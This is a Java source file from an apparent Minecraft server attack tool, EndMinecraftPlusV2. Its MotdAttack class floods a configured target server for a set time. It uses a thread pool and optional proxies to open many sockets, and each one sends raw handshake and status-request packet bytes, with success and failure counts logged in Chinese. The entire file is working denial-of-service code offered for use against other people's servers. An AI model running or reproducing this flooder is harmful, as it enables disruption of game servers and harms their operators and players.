package cn.serendipityr.EndMinecraftPlusV2.AttackManager;

import cn.serendipityr.EndMinecraftPlusV2.MultipleVersion.UniverseMethods;
import cn.serendipityr.EndMinecraftPlusV2.Tools.*;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class MotdAttack {
    private static int count = 0;
    private static int failedCount = 0;

    public static void doAttack(boolean hasProxy) {
        ExecutorService executorService = Executors.newFixedThreadPool(ConfigUtil.MaxConnections);

        long startTime = System.currentTimeMillis();
        String title = hasProxy ? "MotdAttack(P)" : "MotdAttack";
        new Thread(() -> {
            while (System.currentTimeMillis() - startTime < ConfigUtil.AttackTime * 1000) {
                if (!ConfigUtil.isLinux) {
                    SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - " + title + " | 当前连接数: " + count + "个 | 失败次数: " + failedCount + "次");
                    OtherUtils.doSleep(100);
                } else {
                    LogUtil.doLog(0, "当前连接数: " + count + "个 | 失败次数: " + failedCount + "次", title);
                    OtherUtils.doSleep(5000);
                }
            }
        }).start();

        while (System.currentTimeMillis() - startTime < ConfigUtil.AttackTime * 1000) {
            executorService.execute(new getMotdTask(hasProxy));
            OtherUtils.doSleep(ConfigUtil.ConnectDelay);
        }
        shutdownAndAwaitTermination(executorService);
    }

    private static void shutdownAndAwaitTermination(ExecutorService executorService) {
        executorService.shutdown(); // Disable new tasks from being submitted
        try {
            // Wait a while for existing tasks to terminate
            if (!executorService.awaitTermination(60, TimeUnit.SECONDS)) {
                executorService.shutdownNow(); // Cancel currently executing tasks
                // Wait a while for tasks to respond to being cancelled
                if (!executorService.awaitTermination(60, TimeUnit.SECONDS))
                    LogUtil.doLog(1, "Executor did not terminate", null);
            }
        } catch (InterruptedException ie) {
            // (Re-)Cancel if current thread also interrupted
            executorService.shutdownNow();
            // Preserve interrupt status
            Thread.currentThread().interrupt();
        }
    }

    private static class getMotdTask implements Runnable {
        private final boolean hasProxy;

        public getMotdTask(boolean hasProxy) {
            this.hasProxy = hasProxy;
        }

        @Override
        public void run() {
            try {
                // 使用或不使用代理初始化 socket
                if (ProxyUtil.proxies.size() == 0) {
                    return;
                }
                Proxy proxy = hasProxy ? UniverseMethods.getProxy(UniverseMethods.getProxyType(ConfigUtil.ProxyType)) : Proxy.NO_PROXY;
                Socket socket = new Socket(proxy);

                // 连接到服务器
                socket.connect(new InetSocketAddress(ConfigUtil.AttackAddress, ConfigUtil.AttackPort), ConfigUtil.ConnectTimeout * 1000);
                try (OutputStream out = socket.getOutputStream();
                     InputStream in = socket.getInputStream()) {

                    // 向输出流写入数据
                    out.write(new byte[]{0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01});
                    out.write(new byte[]{0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01,
                            0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00});
                    out.flush();

                    // 从输入流读取数据
                    byte[] buffer = new byte[12800];
                    if (in.read(buffer) != -1) {
                        LogUtil.doLog(0, "成功发送了Motd更新数据包。", "MotdAttack#" + Thread.currentThread().getName());
                        count++;
                    }
                }

                // 关闭 socket
                socket.close();
                OtherUtils.doSleep(ConfigUtil.ConnectDelay);
            } catch (Throwable e) {
                if (ConfigUtil.ShowFails) {
                    LogUtil.doLog(0, "发生错误: " + e, "MotdAttack#" + Thread.currentThread().getName());
                }
                failedCount++;
            }
        }
    }
}
